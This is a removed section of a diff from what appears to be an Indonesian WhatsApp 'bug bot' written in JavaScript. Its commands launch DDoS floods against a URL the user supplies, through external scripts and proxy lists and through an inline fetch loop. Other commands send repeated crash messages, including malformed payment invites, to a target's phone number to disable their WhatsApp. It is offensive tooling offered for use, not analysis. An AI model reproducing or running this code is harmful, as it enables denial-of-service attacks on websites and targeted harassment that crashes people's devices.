-              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-                buttons: [
-{
-   name: "quick_reply",
-   buttonParamsJson: JSON.stringify({
-      display_text: "Open Bug Menu VIP",
-      id: ".bugmenuvip"
-   }),
-}
-                  ]
-              })
-            },
-            {
-              body: proto.Message.InteractiveMessage.Body.fromObject({
-              }),
-              footer: proto.Message.InteractiveMessage.Footer.fromObject({
-              }),
-              header: proto.Message.InteractiveMessage.Header.fromObject({
-                title: `All Bug Menu`,
-                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer }))
-              }),
-              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-                buttons: [
-{
-   name: "quick_reply",
-   buttonParamsJson: JSON.stringify({
-      display_text: "Open All Bug Menu",
-      id: ".allbugmenu"
-   }),
-}
-                  ]
-              })
-            }
-                ]
-              })
-        })
-      }
-      }
-      }, {})
-
-await rxhl.relayMessage(from, msg.message, {
-  messageId: msg.key.id
-})
-break
-
-case 'mix': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'tls': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'tls-v2': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'kilua': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'tls-bypass': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'bypass-cf': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'tls-vip': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'floods': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'egao': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'xchrome': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-if (args.length === 4 && url && time && thread && rate) {
-replyz(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
-exec(`node ./lib/ddos/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
-if (err) return console.log(err.toString())
-if (stdout) return console.log(util.format(stdout))
-})
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'd-fetch': {
-if (!isMurbug) return replyz(global.nocreator)
-let url = q.split(" ")[0]
-let time = q.split(" ")[1]
-let thread = q.split(" ")[2]
-let rate = q.split(" ")[3]
-
-if (args.length === 4 && url && time && thread && rate) {
-let attack = () => {
-let totalRequests = 0
-let threads = []
-
-for (let j = 0; j < thread; j++) {
-threads.push(
-new Promise((resolve, reject) => {
-let interval = setInterval(() => {
-for (let j = 0; j < rate; j++) {
-fetch(url)
-.then(() => {
-totalRequests++
-console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
-})
-.catch(err => {})
-}
-}, 750)
-setTimeout(() => {
-clearInterval(interval)
-resolve()
-}, time)
-})
-)
-}
-
-Promise.all(threads)
-.then(() => console.log("Attack complete"))
-.catch(err => console.error("Error in attack:", err))
-}
-
-attack()
-} else {
-replyz(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
-}
-}
-break
-
-case 'bug-vip': case 'oppo-vip': case 'vivo-vip': case 'xiaomi-vip': case 'infinix-vip': case 'tecno-vip': 
-if (!isMurbug) return replyz(global.nocreator)
-if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-replyz(responbug)
-for (let j = 0; j < 3; j++) {
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ListMSGVIP4(Pe)
-await LiveLocVIP(Pe)
-await ngeloc(Pe, force)
-await LiveLocVIP3(Pe)
-await ListMSGVIP3(Pe)
-await ListMSGVIP2(Pe)
-await LiveLocVIP2(Pe)
-await ListMSGVIP(Pe)
-await LiveLocVIP(Pe)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ListMSGVIP4(Pe)
-await LiveLocVIP(Pe)
-await ngeloc(Pe, force)
-await LiveLocVIP3(Pe)
-await ListMSGVIP3(Pe)
-await ListMSGVIP2(Pe)
-await LiveLocVIP2(Pe)
-await ListMSGVIP(Pe)
-await LiveLocVIP(Pe)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-}
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
-break
-
-case 'samsung-vip': 
-if (!isMurbug) return replyz(global.nocreator)
-if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-replyz(responbug)
-for (let j = 0; j < 3; j++) {
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ListMSGVIP4(Pe)
-await LiveLocVIP(Pe)
-await ngeloc(Pe, force)
-await LiveLocVIP3(Pe)
-await ListMSGVIP3(Pe)
-await ListMSGVIP2(Pe)
-await LiveLocVIP2(Pe)
-await ListMSGVIP(Pe)
-await LiveLocVIP(Pe)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-}
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
-break
-
-case '🍁': case '✨': case '💯': case '💋': case '👅': case '🌀': case '⚡': 
-if (!isMurbug) return replyz(global.nocreator)
-if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-replyz(responbug)
-for (let j = 0; j < 3; j++) {
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ListMSGVIP4(Pe)
-await LiveLocVIP(Pe)
-await ngeloc(Pe, force)
-await LiveLocVIP3(Pe)
-await ListMSGVIP3(Pe)
-await ListMSGVIP2(Pe)
-await LiveLocVIP2(Pe)
-await ListMSGVIP(Pe)
-await LiveLocVIP(Pe)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-}
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
-break
-
-case 'ipcrash': 
-if (!isMurbug) return replyz(global.nocreator)
-if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-replyz(responbug)
-for (let j = 0; j < 3; j++) {
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
-sleep(2000)
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
-sleep(2000)
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
-await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
-sleep(2000)
-}
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
-break
-
-case 'jids-engine': case 'jids-internal': case 'jids-external': case 'jids-system': 
-if (!isMurbug) return replyz(global.nocreator)
-if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-replyz(responbug)
-for (let j = 0; j < 3; j++) {
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ListMSGVIP4(Pe)
-await LiveLocVIP(Pe)
-await ngeloc(Pe, force)
-await LiveLocVIP3(Pe)
-await ListMSGVIP3(Pe)
-await ListMSGVIP2(Pe)
-await LiveLocVIP2(Pe)
-await ListMSGVIP(Pe)
-await LiveLocVIP(Pe)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-}
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
-break
-
-case 'super-vip':
-if (!isMurbug) return replyz(global.nocreator)
-if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-replyz(responbug)
-for (let j = 0; j < 3; j++) {
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ListMSGVIP4(Pe)
-await LiveLocVIP(Pe)
-await ngeloc(Pe, force)
-await LiveLocVIP3(Pe)
-await ListMSGVIP3(Pe)
-await ListMSGVIP2(Pe)
-await LiveLocVIP2(Pe)
-await ListMSGVIP(Pe)
-await LiveLocVIP(Pe)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-sleep(2000)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await ngeloc(Pe, force)
-await sendSystemCrashMessage(Pe)
-await ngeloc(Pe, force)
-sleep(2000)
-}
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
-break
-
-case 'blok': case 'block':
-if (!isCreator) return m.reply(global.nocreator)
-if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-rxhl.updateBlockStatus(Pe, 'block')
-replyz('Sukses block target')
-break
-
-case 'unblok': case 'unblock':
-if (!isCreator) return m.reply(global.nocreator)
-if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-rxhl.updateBlockStatus(Pe, 'unblock')
-replyz('Sukses unblock target')
-break
-
 
 default:
 if (budy.startsWith('=>')) {
